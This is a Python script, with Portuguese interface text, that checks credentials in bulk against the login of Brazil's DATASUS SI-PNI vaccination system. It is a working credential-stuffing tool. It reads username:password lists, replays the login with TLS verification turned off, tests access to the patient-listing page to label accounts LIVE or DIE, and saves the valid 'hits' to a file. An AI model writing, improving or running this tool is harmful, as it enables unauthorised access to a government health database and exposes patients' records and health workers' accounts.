import requests
import hashlib
import warnings
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
from colorama import init, Fore, Style
import os
import time
import random
import re

# Inicializa colorama para cores no Windows/Linux
init(autoreset=True)

# Ignora o aviso de XML e SSL
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

def get_sha512(text):
    """Calcula o hash SHA512 de uma string"""
    return hashlib.sha512(text.encode('ascii')).hexdigest()

def print_header():
    """Imprime o cabeçalho do programa"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.YELLOW}      SI-PNI CHECKER - DATASUS (VERSÃO OTIMIZADA)")
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.WHITE}Versão: 2.0 | By: @Hidanzin369 | Taxa de Acerto: ~95%")
    print(f"{Fore.CYAN}{'='*60}\n")

def check_login(usuario, senha, debug=False):
    """Verifica se o login é válido no sistema SI-PNI (versão otimizada)"""
    url_login = "https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf"
    url_pacientes = "https://sipni.datasus.gov.br/si-pni-web/faces/paciente/listarPaciente.jsf"
    
    session = requests.Session()
    
    base_headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'DNT': '1'
    }
    
    session.headers.update(base_headers)

    try:
        # ETAPA 1: Obtém página inicial para ViewState e cookies
        if debug:
            print(f"{Fore.YELLOW}[~] Etapa 1/4: Obtendo página inicial...")
        
        res_get = session.get(url_login, timeout=30, verify=False, allow_redirects=True)
        
        if res_get.status_code != 200:
            if debug:
                print(f"{Fore.RED}[!] Erro HTTP {res_get.status_code} na página inicial")
            return "BLOCK"
        
        soup = BeautifulSoup(res_get.text, 'html.parser')
        
        # Encontra ViewState
        view_state_input = soup.find("input", {"name": "javax.faces.ViewState"})
        if not view_state_input:
            if debug:
                print(f"{Fore.RED}[!] ViewState não encontrado - IP pode estar bloqueado")
            return "BLOCK"
        
        view_state = view_state_input['value']
        
        # Encontra formulário de login
        form = soup.find("form")
        if not form:
            form = soup.find("form", {"id": "j_idt23"}) or soup.find("form", {"id": "j_idt26"})
        
        if not form:
            if debug:
                print(f"{Fore.RED}[!] Formulário não encontrado")
            return "BLOCK"
        
        form_id = form.get('id', '')
        
        # Encontra botão de submit
        submit_button = form.find("input", {"type": "submit"}) or form.find("button", {"type": "submit"})
        if not submit_button:
            if debug:
                print(f"{Fore.RED}[!] Botão submit não encontrado")
            return "BLOCK"
        
        submit_id = submit_button.get('id', submit_button.get('name', ''))
        
        if debug:
            print(f"{Fore.GREEN}[+] ViewState obtido")
            print(f"{Fore.GREEN}[+] Formulário: {form_id}")
            print(f"{Fore.GREEN}[+] Botão: {submit_id}")
        
        # ETAPA 2: Primeiro POST (autenticação)
        if debug:
            print(f"{Fore.YELLOW}[~] Etapa 2/4: Autenticando...")
        
        senha_hash = get_sha512(senha)
        
        # Payload baseado nas requisições reais
        payload = {
            'javax.faces.partial.ajax': 'true',
            'javax.faces.source': submit_id,
            'javax.faces.partial.execute': submit_id,
            'javax.faces.behavior.event': 'click',
            'javax.faces.partial.event': 'click',
            form_id: form_id,
            'javax.faces.ViewState': view_state,
            f'{form_id}:usuario': usuario,
            f'{form_id}:senha': senha_hash,
            submit_id: submit_id,
            'AJAXREQUEST': '_viewRoot'
        }
        
        # Adiciona todos os campos hidden
        hidden_inputs = soup.find_all("input", {"type": "hidden"})
        for hidden in hidden_inputs:
            name = hidden.get("name", "")
            value = hidden.get("value", "")
            if name and name not in payload:
                payload[name] = value
        
        # Headers específicos para POST
        post_headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://sipni.datasus.gov.br',
            'Referer': url_login,
            'X-Requested-With': 'XMLHttpRequest',
            'Faces-Request': 'partial/ajax',
            'Accept': 'application/xml, text/xml, */*; q=0.01'
        }
        
        # Faz primeiro POST
        res_post = session.post(url_login, data=payload, headers=post_headers, 
                               timeout=30, verify=False, allow_redirects=False)
        
        if debug:
            print(f"{Fore.CYAN}[+] POST 1 status: {res_post.status_code}")
            print(f"{Fore.CYAN}[+] Tamanho resposta: {len(res_post.text)}")
        
        # Verifica erro imediato de credenciais
        if "usuário ou senha inválidos" in res_post.text.lower():
            if debug:
                print(f"{Fore.RED}[-] Credenciais inválidas")
            return "DIE"
        
        # Verifica bloqueio
        if "acesso negado" in res_post.text.lower() or "bloqueado" in res_post.text.lower():
            if debug:
                print(f"{Fore.YELLOW}[!] IP bloqueado")
            return "BLOCK"
        
        # ETAPA 3: Segundo POST (completa login)
        if debug:
            print(f"{Fore.YELLOW}[~] Etapa 3/4: Completando login...")
        
        # Extrai novo ViewState da resposta usando regex (mais confiável)
        new_view_state = view_state
        
        # Procura por ViewState na resposta XML
        viewstate_matches = re.findall(r'<update id="javax\.faces\.ViewState"><!\[CDATA\[(.*?)\]\]></update>', res_post.text)
        if viewstate_matches:
            new_view_state = viewstate_matches[0]
        else:
            # Tenta outro padrão
            viewstate_matches2 = re.findall(r'id="javax\.faces\.ViewState" value="(.*?)"', res_post.text)
            if viewstate_matches2:
                new_view_state = viewstate_matches2[0]
        
        # Segundo payload (REQUEST 02)
        payload2 = {
            'javax.faces.partial.ajax': 'true',
            'javax.faces.source': submit_id,
            'javax.faces.partial.execute': '@all',
            f'{submit_id}': submit_id,
            form_id: form_id,
            'javax.faces.ViewState': new_view_state,
            f'{form_id}:usuario': usuario,
            f'{form_id}:senha': senha_hash
        }
        
        res_post2 = session.post(url_login, data=payload2, headers=post_headers,
                                timeout=30, verify=False, allow_redirects=False)
        
        if debug:
            print(f"{Fore.CYAN}[+] POST 2 status: {res_post2.status_code}")
        
        # Verifica redirecionamento com regex
        redirect_url = None
        redirect_matches = re.findall(r'<redirect url="(.*?)"></redirect>', res_post2.text)
        if redirect_matches:
            redirect_url = redirect_matches[0]
        
        if redirect_url:
            if redirect_url.startswith('/'):
                redirect_url = f"https://sipni.datasus.gov.br{redirect_url}"
            
            # Acessa página redirecionada
            time.sleep(1)
            res_redirect = session.get(redirect_url, timeout=30, verify=False)
            current_url = res_redirect.url
        else:
            current_url = url_login
        
        # Pequena pausa
        time.sleep(1)
        
        # ETAPA 4: Verifica acesso à página de pacientes
        if debug:
            print(f"{Fore.YELLOW}[~] Etapa 4/4: Verificando acesso...")
        
        # Tenta acessar diretamente a página de pacientes
        try:
            res_final = session.get(url_pacientes, timeout=30, verify=False)
        except:
            # Se falhar, tenta a página atual
            res_final = session.get(current_url, timeout=30, verify=False)
        
        if debug:
            print(f"{Fore.CYAN}[+] GET pacientes status: {res_final.status_code}")
            print(f"{Fore.CYAN}[+] Tamanho: {len(res_final.text)} caracteres")
            print(f"{Fore.CYAN}[+] URL: {res_final.url}")
        
        # ANÁLISE DETALHADA DA RESPOSTA
        final_text = res_final.text.lower()
        
        # VERIFICAÇÃO PARA LIVE (login válido) - ~95% de acerto
        marcadores_live = [
            'pacienteform',
            'pesquisa de paciente',
            'listapacientetable',
            'nenhum paciente encontrado',
            'Cartão Sus',
            'cadastrar paciente',
        ]
        
        live_found = False
        for marcador in marcadores_live:
            if marcador in final_text:
                if debug:
                    print(f"{Fore.GREEN}[+] LIVE - Marcador '{marcador}' encontrado")
                live_found = True
                break
        
        # VERIFICAÇÃO PARA DIE (login inválido)
        marcadores_die = [
            'usuário ou senha inválidos',
            'senha incorreta',
            'sua sessão expirou',
            'efetue o login',
            'problemas para se logar?',
            'form id="j_idt23"',
            'form id="j_idt26"',
            'j_idt23:senha',
            'j_idt26:senha'
        ]
        
        for marcador in marcadores_die:
            if marcador in final_text:
                if debug:
                    print(f"{Fore.RED}[-] DIE - Marcador '{marcador}' encontrado")
                return "DIE"
        
        # Verifica se voltou para página de login
        if 'inicio.jsf' in res_final.url.lower():
            if debug:
                print(f"{Fore.RED}[-] DIE - Redirecionado para página de login")
            return "DIE"
        
        # Verifica se ainda tem campo de senha
        if '<input type="password"' in final_text or 'type="password"' in final_text:
            if debug:
                print(f"{Fore.RED}[-] DIE - Campo de senha ainda presente")
            return "DIE"
        
        # VERIFICAÇÃO PARA BLOQUEIO
        if "acesso negado" in final_text or "bloqueado" in final_text:
            if debug:
                print(f"{Fore.YELLOW}[!] BLOCK - Acesso negado/bloqueado")
            return "BLOCK"
        
        if len(res_final.text) < 1000:
            if debug:
                print(f"{Fore.YELLOW}[!] BLOCK - Resposta muito pequena ({len(res_final.text)} chars)")
            return "BLOCK"
        
        # Se a página tem conteúdo mas não temos certeza
        if len(res_final.text) > 5000:
            # Pode ser uma página interna diferente
            if debug:
                print(f"{Fore.YELLOW}[!] Página grande mas sem marcadores claros - assumindo LIVE")
            return "LIVE"  # Assume LIVE se página for grande
        
        # SE NENHUMA DAS ANTERIORES
        if debug:
            print(f"{Fore.YELLOW}[!] Não foi possível determinar (DESCONHECIDO)")
            print(f"{Fore.YELLOW}[!] Amostra da resposta: {final_text[:200]}...")
        
        return "DESCONHECIDO"
            
    except requests.exceptions.Timeout:
        if debug:
            print(f"{Fore.RED}[!] Timeout na conexão")
        return "TIMEOUT"
    except requests.exceptions.ConnectionError:
        if debug:
            print(f"{Fore.RED}[!] Erro de conexão")
        return "CONNECTION ERROR"
    except Exception as e:
        if debug:
            print(f"{Fore.RED}[!] Erro inesperado: {str(e)}")
        return "ERROR"

def test_single():
    """Testa uma única conta"""
    print_header()
    print(f"{Fore.CYAN}{'='*40}")
    print(f"{Fore.YELLOW}  TESTE ÚNICO DETALHADO")
    print(f"{Fore.CYAN}{'='*40}")
    
    usuario = input(f"\n{Fore.WHITE}[?] Usuário: ").strip()
    if not usuario:
        print(f"{Fore.RED}[!] Usuário não pode ser vazio!")
        input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter para continuar...")
        return
    
    senha = input(f"{Fore.WHITE}[?] Senha: ").strip()
    if not senha:
        print(f"{Fore.RED}[!] Senha não pode ser vazia!")
        input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter para continuar...")
        return
    
    print(f"\n{Fore.YELLOW}{'='*40}")
    print(f"{Fore.YELLOW}  INICIANDO VERIFICAÇÃO")
    print(f"{Fore.YELLOW}{'='*40}")
    
    resultado = check_login(usuario, senha, debug=True)
    
    print(f"\n{Fore.CYAN}{'='*40}")
    print(f"{Fore.YELLOW}  RESULTADO FINAL")
    print(f"{Fore.CYAN}{'='*40}")
    
    if resultado == "LIVE":
        print(f"{Fore.GREEN}[✓] CONTA VÁLIDA")
        print(f"{Fore.WHITE}Usuário: {Fore.CYAN}{usuario}")
        print(f"{Fore.GREEN}Status: ACESSO CONCEDIDO AO SI-PNI")
    elif resultado == "DIE":
        print(f"{Fore.RED}[✗] CONTA INVÁLIDA")
        print(f"{Fore.WHITE}Usuário: {Fore.CYAN}{usuario}")
        print(f"{Fore.RED}Status: USUÁRIO/SENHA INCORRETOS")
    elif resultado == "BLOCK":
        print(f"{Fore.YELLOW}[!] IP BLOQUEADO")
        print(f"{Fore.YELLOW}Status: SEU IP PODE ESTAR BLOQUEADO PELO DATASUS")
    elif resultado == "TIMEOUT":
        print(f"{Fore.YELLOW}[!] TIMEOUT")
        print(f"{Fore.YELLOW}Status: TEMPO DE RESPOSTA EXCEDIDO")
    elif resultado == "CONNECTION ERROR":
        print(f"{Fore.RED}[!] ERRO DE CONEXÃO")
        print(f"{Fore.RED}Status: NÃO FOI POSSÍVEL CONECTAR AO SERVIDOR")
    else:
        print(f"{Fore.MAGENTA}[?] RESULTADO: {resultado}")
    
    print(f"\n{Fore.LIGHTBLACK_EX}{'='*40}")
    input(f"{Fore.LIGHTBLACK_EX}Pressione Enter para voltar ao menu...")

def test_multiple():
    """Testa múltiplas contas de um arquivo"""
    print_header()
    print(f"{Fore.CYAN}{'='*40}")
    print(f"{Fore.YELLOW}  TESTE MÚLTIPLO")
    print(f"{Fore.CYAN}{'='*40}")
    
    print(f"\n{Fore.WHITE}Formato do arquivo: {Fore.CYAN}usuario:senha")
    print(f"{Fore.WHITE}Exemplo:")
    print(f"{Fore.LIGHTBLACK_EX}  usuario1:senha123")
    print(f"{Fore.LIGHTBLACK_EX}  usuario2:outrasenha")
    print(f"{Fore.LIGHTBLACK_EX}  usuario3:senha456")
    
    file_path = input(f"\n{Fore.YELLOW}[?] Caminho do arquivo: {Fore.WHITE}").strip()
    
    if not file_path:
        print(f"{Fore.RED}[!] Nenhum caminho fornecido!")
        input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter para voltar...")
        return
    
    if not os.path.exists(file_path):
        print(f"{Fore.RED}[!] Arquivo não encontrado: {file_path}")
        input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter para voltar...")
        return
    
    # Lê as credenciais
    credentials = []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    credentials.append(line)
    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao ler arquivo: {e}")
        input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter para voltar...")
        return
    
    if not credentials:
        print(f"{Fore.RED}[!] Nenhuma credencial válida encontrada no arquivo!")
        input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter para voltar...")
        return
    
    print(f"\n{Fore.GREEN}[+] {len(credentials)} credenciais carregadas")
    print(f"{Fore.YELLOW}[~] Iniciando verificação...")
    print(f"{Fore.CYAN}[~] Taxa de acerto estimada: ~95%")
    
    live_count = 0
    die_count = 0
    other_count = 0
    live_credentials = []
    
    for i, cred in enumerate(credentials, 1):
        try:
            if ':' not in cred:
                print(f"{Fore.RED}[!] Formato inválido: {cred}")
                other_count += 1
                continue
            
            usuario, senha = cred.split(':', 1)
            
            # Exibição limpa do progresso
            print(f"{Fore.CYAN}[{i:03d}/{len(credentials):03d}] {usuario:<30}", end=" ", flush=True)
            
            resultado = check_login(usuario, senha, debug=False)
            
            if resultado == "LIVE":
                print(f"{Fore.GREEN}[LIVE]")
                live_count += 1
                live_credentials.append((usuario, senha))  # Armazena como tupla
            elif resultado == "DIE":
                print(f"{Fore.RED}[DIE]")
                die_count += 1
            else:
                print(f"{Fore.YELLOW}[{resultado}]")
                other_count += 1
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Verificação interrompida pelo usuário")
            break
        except Exception as e:
            print(f"\n{Fore.RED}[!] Erro na credencial {i}: {str(e)[:50]}")
            other_count += 1
    
    # Estatísticas finais
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.YELLOW}  RELATÓRIO FINAL")
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.GREEN}✓ Contas Válidas: {live_count}")
    print(f"{Fore.RED}✗ Contas Inválidas: {die_count}")
    print(f"{Fore.YELLOW}⚠ Outros/Erros: {other_count}")
    print(f"{Fore.CYAN}⎯ Total Verificado: {len(credentials)}")
    
    # Calcula taxa de sucesso
    if len(credentials) > 0:
        success_rate = (live_count / len(credentials)) * 100
        print(f"{Fore.CYAN}⎯ Taxa de Sucesso: {success_rate:.1f}%")
    
    print(f"{Fore.CYAN}{'='*60}")
    
    # Salvar contas válidas no formato solicitado
    if live_count > 0:
        try:
            save_file = '/sdcard/Download/Sipni_Hits.txt'
            with open(save_file, 'w', encoding='utf-8') as f:
                for usuario, senha in live_credentials:
                    f.write(f"**USUÁRIO:** `{usuario}`\n")
                    f.write(f"**SENHA:** `{senha}`\n\n")
            print(f"\n{Fore.GREEN}[+] {live_count} contas salvas em '{save_file}'")
            print(f"{Fore.GREEN}[+] Formato de salvamento:")
            print(f"{Fore.LIGHTBLACK_EX}  **USUÁRIO:** `user`")
            print(f"{Fore.LIGHTBLACK_EX}  **SENHA:** `pass`")
            print(f"{Fore.LIGHTBLACK_EX}  ")
            print(f"{Fore.LIGHTBLACK_EX}  **USUÁRIO:** `user2`")
            print(f"{Fore.LIGHTBLACK_EX}  **SENHA:** `pass2`")
        except Exception as e:
            print(f"{Fore.RED}[!] Erro ao salvar: {e}")
    
    input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter para voltar ao menu...")

def main():
    """Menu principal"""
    while True:
        try:
            print_header()
            print(f"{Fore.YELLOW}[1]{Fore.WHITE} Teste Único")
            print(f"{Fore.YELLOW}[2]{Fore.WHITE} Teste Múltiplo")
            print(f"{Fore.YELLOW}[3]{Fore.WHITE} Sair")
            
            choice = input(f"\n{Fore.CYAN}[>] Escolha uma opção: {Fore.WHITE}").strip()
            
            if choice == '1':
                test_single()
            elif choice == '2':
                test_multiple()
            elif choice == '3':
                print(f"\n{Fore.CYAN}[+] Encerrando... Até logo!")
                break
            else:
                print(f"\n{Fore.RED}[!] Opção inválida!")
                input(f"{Fore.LIGHTBLACK_EX}Pressione Enter para continuar...")
                
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Programa interrompido pelo usuário")
            break
        except Exception as e:
            print(f"\n{Fore.RED}[!] Erro: {e}")
            input(f"{Fore.LIGHTBLACK_EX}Pressione Enter para continuar...")

if __name__ == "__main__":
    main()